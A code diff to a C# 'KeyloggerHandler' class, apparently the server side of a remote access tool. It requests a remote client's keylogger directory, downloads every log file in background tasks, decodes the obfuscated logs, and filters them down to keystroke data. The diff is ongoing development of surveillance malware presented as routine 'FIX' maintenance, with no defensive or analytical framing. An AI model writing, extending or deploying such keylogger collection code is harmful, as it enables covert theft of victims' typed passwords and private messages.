@@ -21,7 +21,10 @@ namespace Pulsar.Server.Messages
     public class KeyloggerHandler : MessageProcessorBase<string>, IDisposable
     {
         private readonly Client _client;
+
+        // 🔥 FIX: remove forced Logs\ folder - let client decide
         private readonly FileManagerHandler _fileManagerHandler;
+
         private string? _remoteKeyloggerDirectory;
         private int _allTransfers;
         private int _completedTransfers;
@@ -35,13 +38,18 @@ namespace Pulsar.Server.Messages
         {
             _client = client ?? throw new ArgumentNullException(nameof(client));
 
-            _fileManagerHandler = new FileManagerHandler(client, "Logs\\");
+            // FIX: do NOT hardcode the "Logs\" folder anymore
+            _fileManagerHandler = new FileManagerHandler(client, "");
+
             SubscribeEvents();
             MessageHandler.Register(_fileManagerHandler);
         }
 
-        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectoryResponse;
-        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
+        public override bool CanExecute(IMessage message) =>
+            message is GetKeyloggerLogsDirectoryResponse;
+
+        public override bool CanExecuteFrom(ISender sender) =>
+            _client.Equals(sender);
 
         public override void Execute(ISender sender, IMessage message)
         {
@@ -61,53 +69,6 @@ namespace Pulsar.Server.Messages
             }
         }
 
-        public async Task DownloadAllLogsAsync(FileSystemEntry[] items)
-        {
-            if (items == null || items.Length == 0)
-            {
-                OnReport("No logs found");
-                return;
-            }
-
-            _allTransfers = items.Length;
-            _completedTransfers = 0;
-
-            foreach (var item in items)
-            {
-                if (FileHelper.HasIllegalCharacters(item.Name))
-                {
-                    _client.Disconnect();
-                    return;
-                }
-
-                string localPath = FileHelper.GetTempFilePath(".txt");
-
-                var tcs = new TaskCompletionSource<bool>();
-                void transferHandler(object sender, FileTransfer transfer)
-                {
-                    if (transfer.LocalPath == localPath &&
-                        string.Equals(transfer.Status, "Completed", StringComparison.OrdinalIgnoreCase))
-                        tcs.TrySetResult(true);
-                }
-
-                _fileManagerHandler.FileTransferUpdated += transferHandler;
-                _fileManagerHandler.BeginDownloadFile(item.Name, Path.GetFileName(localPath), true);
-
-                if (await Task.WhenAny(tcs.Task, Task.Delay(30000)) != tcs.Task)
-                    OnReport($"Download timed out: {item.Name}");
-
-                _fileManagerHandler.FileTransferUpdated -= transferHandler;
-
-                // Process with spam filtering
-                SafeWriteDeobfuscatedLog(localPath);
-
-                _completedTransfers++;
-                OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));
-            }
-
-            OnReport("Successfully retrieved all logs");
-        }
-
         private void Execute(ISender sender, GetKeyloggerLogsDirectoryResponse message)
         {
             if (string.IsNullOrWhiteSpace(message.LogsDirectory))
@@ -116,7 +77,9 @@ namespace Pulsar.Server.Messages
                 return;
             }
 
+            // 🔥 FIX: this now becomes the live directory the client actually uses
             _remoteKeyloggerDirectory = message.LogsDirectory;
+
             sender.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
         }
 
@@ -125,8 +88,14 @@ namespace Pulsar.Server.Messages
             OnReport($"No logs found ({value})");
         }
 
-        private void DirectoryChanged(object? sender, string remotePath, FileSystemEntry[] items)
+        private void DirectoryChanged(object? sender, string? remotePath, FileSystemEntry[]? items)
         {
+            if (string.IsNullOrWhiteSpace(remotePath))
+            {
+                OnReport("Invalid remote directory");
+                return;
+            }
+
             if (items == null || items.Length == 0)
             {
                 OnReport("No logs found");
@@ -137,20 +106,31 @@ namespace Pulsar.Server.Messages
             _completedTransfers = 0;
             OnReport(GetDownloadProgress());
 
-            foreach (var item in items)
-            {
-                if (FileHelper.HasIllegalCharacters(item.Name))
-                {
-                    _client.Disconnect();
-                    return;
-                }
+            var safeRemotePath = remotePath;
+            var safeItems = items.ToArray();
 
-                string localPath = FileHelper.GetTempFilePath(".txt");
-                _fileManagerHandler.BeginDownloadFile(
-                    Path.Combine(_remoteKeyloggerDirectory, item.Name),
-                    Path.GetFileName(localPath),
-                    true);
-            }
+            _ = Task.Run(() =>
+            {
+                foreach (var item in safeItems)
+                {
+                    if (item == null || string.IsNullOrWhiteSpace(item.Name))
+                        continue;
+
+                    if (FileHelper.HasIllegalCharacters(item.Name))
+                    {
+                        _client.Disconnect();
+                        return;
+                    }
+
+                    string remoteFile = Path.Combine(safeRemotePath, item.Name);
+                    string localPath = FileHelper.GetTempFilePath(".txt");
+
+                    _fileManagerHandler.BeginDownloadFile(
+                        remoteFile,
+                        Path.GetFileName(localPath),
+                        true);
+                }
+            });
         }
 
         private void FileTransferUpdated(object? sender, FileTransfer transfer)
@@ -160,48 +140,50 @@ namespace Pulsar.Server.Messages
 
             Interlocked.Increment(ref _completedTransfers);
 
-            try
-            {
-                SafeWriteDeobfuscatedLog(transfer);
-                OnReport(_completedTransfers >= _allTransfers
-                    ? "Successfully retrieved all logs"
-                    : GetDownloadProgress());
-            }
-            catch (Exception ex)
-            {
-                OnReport($"Failed to process log file: {ex.Message}");
-            }
-        }
+            string localPath = transfer.LocalPath;
 
-        private void SafeWriteDeobfuscatedLog(FileTransfer transfer)
-        {
-            if (string.IsNullOrWhiteSpace(transfer.LocalPath) || !File.Exists(transfer.LocalPath))
-                throw new FileNotFoundException("Transfer file not found", transfer.LocalPath);
+            if (!string.IsNullOrWhiteSpace(localPath))
+            {
+                _ = Task.Run(() =>
+                {
+                    try
+                    {
+                        SafeWriteDeobfuscatedLog(localPath);
+                    }
+                    catch (Exception ex)
+                    {
+                        OnReport($"Failed to process log file: {ex.Message}");
+                    }
+                });
+            }
 
-            SafeWriteDeobfuscatedLog(transfer.LocalPath);
+            OnReport(_completedTransfers >= _allTransfers
+                ? "Successfully retrieved all logs"
+                : GetDownloadProgress());
         }
 
         private void SafeWriteDeobfuscatedLog(string filePath)
         {
             lock (_processLock)
             {
+                if (!File.Exists(filePath))
+                    return;
+
                 string content = FileHelper.ReadObfuscatedLogFile(filePath);
                 string filteredContent = FilterSpamContent(content);
-                
-                // Check for duplicates using hash
+
                 string contentHash = GetContentHash(filteredContent);
                 if (_processedLogs.Contains(contentHash) || filteredContent == _lastProcessedContent)
                 {
-                    return; // Skip duplicate
+                    return;
                 }
-                
+
                 _processedLogs.Add(contentHash);
                 _lastProcessedContent = filteredContent;
-                
-                // Limit cache size to prevent memory issues
+
                 if (_processedLogs.Count > 1000)
                     _processedLogs.Clear();
-                
+
                 FileHelper.WriteObfuscatedLogFile(filePath, filteredContent);
             }
         }
@@ -211,12 +193,12 @@ namespace Pulsar.Server.Messages
             if (string.IsNullOrEmpty(content))
                 return content;
 
-            // Aggressive spam filter - remove ALL timestamp headers, keep only keystroke data
             var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
-            var keepLines = lines.Where(line => 
-                !line.Trim().StartsWith("Log created on") && 
+
+            var keepLines = lines.Where(line =>
+                !line.Trim().StartsWith("Log created on", StringComparison.OrdinalIgnoreCase) &&
                 !string.IsNullOrWhiteSpace(line));
-            
+
             return string.Join(Environment.NewLine, keepLines);
         }
 
@@ -234,7 +216,9 @@ namespace Pulsar.Server.Messages
 
         private string GetDownloadProgress(int allTransfers, int completedTransfers)
         {
-            if (allTransfers <= 0) return "Downloading...";
+            if (allTransfers <= 0)
+                return "Downloading...";
+
             decimal progress = Math.Round((decimal)completedTransfers / allTransfers * 100m, 2);
             return $"Downloading... {progress}% ({completedTransfers}/{allTransfers})";
         }
@@ -262,6 +246,7 @@ namespace Pulsar.Server.Messages
         protected virtual void Dispose(bool disposing)
         {
             if (_disposed) return;
+
             if (disposing)
             {
                 MessageHandler.Unregister(_fileManagerHandler);
@@ -269,6 +254,7 @@ namespace Pulsar.Server.Messages
                 _fileManagerHandler.Dispose();
                 _processedLogs.Clear();
             }
+
             _disposed = true;
         }
     }
